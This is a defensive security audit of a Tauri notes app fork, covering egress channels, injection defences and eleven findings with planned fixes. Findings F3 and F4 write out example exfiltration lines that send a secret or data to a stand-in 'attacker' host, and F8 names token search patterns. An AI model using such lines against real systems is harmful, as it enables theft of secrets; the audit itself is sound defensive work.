# Security audit: telemetry, egress, and hardening findings

Date: 2026-09-25
Scope: full repository at `main` (e28557f), v0.7.3, fork `borgand/sodilaud` of `crims0n/scratchpad`.
Method: six independent read-only reviews (MCP transport, frontend JS, supply chain and CI,
Rust storage and IPC, renderer injection surface, Tauri platform configuration) plus direct
reading of every network-capable path. Baseline at audit time: `npm run check` 280/280 pass,
`cargo test --lib` 23/23 pass, `npm audit` 0 findings.

## Verdict on the primary question

**No telemetry, no analytics, no crash reporting, no accounts, no sync, no remote
upload of user data.** Every claim in `README.md:7,58` holds against the code.

Three things were confirmed by direct reading rather than by trust in the docs:

1. The frontend cannot reach the network. No `fetch`, `XMLHttpRequest`, `WebSocket`,
   `EventSource`, `sendBeacon`, `new Image`, `Worker`, `RTC*`, dynamic `import()`, CSS
   `url()` or `@import` anywhere in `src/`. `src/index.html:10-14` loads only local
   files, and `marked`, `highlight.js` and `diff` are vendored into `src/vendor/` at
   build time by `scripts/vendor-marked.mjs` (local `copyFile` only, no network step).
   The npm package name `@highlightjs/cdn-assets` is only the name of the prebuilt
   browser bundle; no CDN is contacted.
2. CSP (`src-tauri/tauri.conf.json:21`) sets `connect-src ipc: http://ipc.localhost`,
   which blocks any webview request to a network host, and `script-src 'self'` with no
   `unsafe-eval`.
3. The only listener is `127.0.0.1:39393` for MCP (`src-tauri/src/mcp.rs:279`). It never
   binds a routable interface. There is no UDP socket, Unix socket or named pipe.

## Egress channels that do exist

| Channel | Default | Sends your data? | What actually leaves |
|---|---|---|---|
| Update check `updates.rs:129` | Off; `automatic` defaults false (`updates.js:11`) | No content | IP, SNI, `User-Agent: Scratchpad-update-check` |
| MCP agent access | Off, not persisted across launches | Yes, by design | Full note content to the connected agent, which usually forwards to a model provider |
| Link click | Requires a click | Only the URL | The URL in the note, via the system browser |
| Webview navigation | Unrestricted | Only what the script puts there | Any URL a renderer script assigns to `location.href` |
| Workspace location | User choice | Yes, if you pick a synced folder | Everything, via iCloud/Dropbox |

The update check is well built: `https_only(true)`, redirects disabled, 10 s timeout,
1 MiB response cap, a `repository` and `schema_version` pin, per-field validation
(`updates.rs:74-116`), and release URLs restricted to a parsed
`https://github.com/crims0n/scratchpad/releases/tag/<semver>` prefix (`updates.rs:62-72`).
It is a GET with no query string and no body; the installed version is compared locally and
never sent. There is no auto-downloader and no `tauri-plugin-updater`, so nothing can replace
the binary. Release notes render through `textContent` (`updates.js:163`).

It remains an outbound request to the upstream author's site, from a fork that is not
upstream. It is removed in Task 1.

`reqwest` has exactly one reverse dependency (`cargo tree -i reqwest`: `scratchpad` only), and
`semver` is used only in `updates.rs:3`. Tauri does not pull an HTTP client. Removing the
update check therefore leaves no HTTP client compiled into the binary at all.

## Injection surface

No working script injection was found. Two independent layers hold:

- `sanitizeMarkdownHtml` (`src/markdown.js:64-149`) runs on every marked output before it
  reaches `innerHTML`. It drops `script`, `style`, `svg`, `math`, `iframe`, `form`, `meta`,
  `base`, `object`, `embed` with their contents, unwraps unknown tags, allowlists attributes
  per tag (removing all `on*` and `style`), restricts `a[href]` to `#`, `http(s)`, `mailto`
  after stripping control characters, and requires `img[src]` to match
  `^data:image/(png|gif|jpe?g|webp);base64,`. No DOM clobbering, no remote beacon, no
  foreign-content mutation-XSS class.
- All other `innerHTML` sinks escape their input (`main.js:840,1112,1313,1802,3684,4663`),
  and highlight.js operates on `textContent`.

Verified absent: `eval`, `new Function`, `insertAdjacentHTML`, `document.write`, `srcdoc`,
`createContextualFragment`, `DOMParser`, `outerHTML`, `postMessage` and `message` listeners.
Paste reads `text/plain` only (`src/editor-smart.js:353`), never `text/html`.

## Findings

Severity is rated for this fork's stated threat model: a single-user macOS machine, a
clipboard manager holding live API tokens, and a requirement of zero egress.

### F1. MCP stdio relay hands the token to any local port squatter - High

`MCP_PORT` is a fixed `39393` (`mcp.rs:30`). The relay reads the token file and writes it to
whatever is listening (`mcp.rs:604-617`) before the server authenticates it; the server's only
reply is the byte `0x01` (`mcp.rs:392`). Loopback ports are not per-user on macOS.

Scenario: another local process or user binds `127.0.0.1:39393` while agent access is off. An
MCP host launches `scratchpad --mcp-stdio`; the relay writes your 0600 token to the squatter.
The token never rotates (`mcp.rs:648-649` reuses the file), so the squatter keeps it, can read
every note once the real server binds, and can feed forged tool results to your agent.

Mitigations that already work: constant-time comparison (`mcp.rs:388`), token created with
`create_new` and mode 0600 (`mcp.rs:678-682`), ~244 bits from two UUIDv4 values, 5 s auth
timeout, 256 KiB per-line cap, 32-session cap, loopback-only bind.

Disposition: **documented, not fixed** in this round (owner decision). Fix later by moving to a
Unix domain socket in a 0700 directory with a peer-UID check, or mutual challenge-response plus
rotation on every start.

### F2. `db_path` is trusted from the webview on eight commands - Medium/High

`load_db_notes`, `load_db_folders`, `load_db_trash`, `save_note_db`, `save_notes_db`,
`save_folders_db`, `save_workspace_db` (`lib.rs:320,356,389,428,452,468,493`) and
`set_last_workspace` (`lib.rs:85`) each take `db_path: String` straight from the renderer and
pass it to `rusqlite::Connection::open`, which defaults to read-write, creates files, accepts
URIs and follows symlinks. Nothing canonicalises or validates it.

`build.rs:4` is a bare `tauri_build::build()` with no `AppManifest`, so in Tauri v2 none of the
23 registered commands are permission-checked, and any script in the `main` window can call all
of them. `withGlobalTauri: true` (`tauri.conf.json:12`) additionally exposes `window.__TAURI__`
(Note: `__TAURI_INTERNALS__.invoke` is injected regardless of that flag, so the flag itself is
not the exposure; capabilities are).

Precondition is an XSS, and none was found. Fixed in Task 2 (path ownership) and Task 4
(permission gating).

### F3. Opener allowlist is a CSP bypass - Medium

`capabilities/default.json:10-15` allows `opener:allow-open-url` for `https://*`, `http://*`
and `mailto:*`. `open_url` hands the URL to Launch Services, so the request is made by the
system browser, outside the webview and outside CSP, and a firewall rule keyed on Scratchpad
will not see it. Any renderer script can therefore call
`invoke("plugin:opener|open_url", { url: "https://attacker/?t=" + secret })`.

The only legitimate JS callers today are markdown preview links and two About links
(`index.html:945-946`). Fixed in Task 3.

### F4. Webview navigation is unrestricted - Medium

There is no `on_navigation` hook anywhere in `src-tauri/src`. CSP has no shipped directive that
restricts top-level navigation, so `location.href = "https://attacker/?d=" + data` makes a real
request from the WebKit networking process and `connect-src` does not apply. Fixed in Task 3.

### F5. Nothing is encrypted at rest, and files are world-readable by default - Medium

`rusqlite` is `bundled` without SQLCipher (`Cargo.toml:33`); there is no key material and no
Keychain use. The workspace DB lands wherever the native dialog returns, including
`~/Documents`, which is often iCloud-synced. `Connection::open` creates it with mode 0644 minus
umask, so it is normally world-readable; only the MCP token file is 0600. Preferences
(`lib.rs:48`, `fs::write`) are also 0644. No-workspace mode stores notes in WebKit
localStorage, also plaintext.

### F6. Deleted and edited content stays recoverable - Medium

Every save runs `DELETE FROM notes` and re-inserts all rows (`lib.rs:395`), with no
`PRAGMA secure_delete` and no `VACUUM` anywhere in the tree, so superseded note bodies
accumulate in free pages. Deleting a note copies the full body into the `trash` table
(`lib.rs:117-122`), and emptying trash is a plain `DELETE FROM trash` (`lib.rs:561`). Fixed in
Task 5.

### F7. The fork still uses upstream's app identity - Medium

`tauri.conf.json:5` is `io.github.crims0n.scratchpad` and `productName` is `Scratchpad`. If
upstream is ever installed alongside the fork, the two share the app-data directory, the
workspace location and the MCP token file, so an upstream binary could read fork secrets.
Fixed in Task 5. Note this moves the app-data directory; existing notes must be relocated.

### F8. Clipboard and secret data would flow into the MCP snapshot - Medium, forward-looking

`mcpSnapshotArguments()` (`main.js:340`) sends `{ ...note }` for every note, including unsaved
edits, to the MCP server, and all five read tools are enabled the moment agent access starts
(`mcp.rs:110,299`). `search_notes` is a substring search over full content (`mcp.rs:1098-1128`),
so an agent can grep for `sk-`, `ghp_` or `password`. If clipboard items enter the same
collection, your tokens go to the model provider.

This is a design constraint for the clipboard feature, not a defect today. Task 6 turns it into
a written rule plus an enforced guard.

### F9. Release CI holds a write token while running third-party build code - Low/Medium

`beta-release.yml:80-81` sets `contents: write` for the job that runs `npm ci` (`:131`) and
`tauri-action` (`:144-147`), which compiles roughly 540 crates and runs every `build.rs` with
`GITHUB_TOKEN` in the environment. A single compromised native crate could push commits, swap
release assets, or publish a poisoned release that then triggers `pages.yml`.
`workflow_dispatch` accepts any ref. No `--locked` on any cargo invocation.
`ci.yml:45` runs `npm ci` with install scripts enabled. Fixed in Task 7.

Supply-chain positives found: no npm lifecycle scripts at all (55 packages, zero
`hasInstallScript`), every lockfile entry from an official registry with an integrity hash or
checksum, no git/path/tarball sources, every action SHA-pinned, no `pull_request_target`, no
curl-to-shell, no coverage or error-reporting uploads, no package publishing, `.gitignore`
covers `.env*` and key material.

### F10. Smaller renderer issues - Low

- `isValidColor` (`main.js:4614-4620`) blocks quotes, `;` and control characters but accepts any
  `var(...)` value, because `CSS.supports("color", …)` defers `var()` validation. A crafted
  theme import can inject `url()` inside one declaration; CSP `img-src` prevents the request, so
  impact today is UI breakage.
- `escapeHTML` (`main.js:2814`) calls `str.replace` and throws on non-strings. A theme JSON with
  `"name": 5` is stored unchecked at `main.js:4819` and then throws on every `applyTheme`.
- `show_alert_dialog` (`lib.rs:577-584`) shows a native dialog with renderer-supplied text, a
  phishing primitive if an XSS ever exists.
- Find-bar regex mode (`find.js:83`) runs a user-typed pattern against all note text: ReDoS
  against your own UI, not an injection.

### F11. CSP has dead sources and missing directives - Low

`img-src` includes `asset:` and `http://asset.localhost`, but the asset protocol is not
configured and `protocol-asset` is not compiled (`Cargo.toml:29`), so those sources are dead
weight. `base-uri`, `form-action`, `object-src` and `frame-src` are unset; the first two do not
fall back to `default-src`. Fixed in Task 3.

## Decisions taken for this fork

| Question | Decision |
|---|---|
| Update check | Remove entirely, drop `reqwest` and `semver`, add a CI gate that fails if egress capability reappears |
| MCP port squatting (F1) | Document as a known boundary now, fix later |
| `db_path` (F2) | Full fix: Rust owns the path |
| Secrets at rest (F5, F6) | Guardrails now: 0600, `secure_delete`, and a rule plus guard that clipboard data never reaches MCP |

## Reading order for reviewers

`docs/mcp.md:335-355` and `README.md:50-62` already describe the intended privacy boundary
accurately. Task 1 and Task 6 amend them to match the fork.
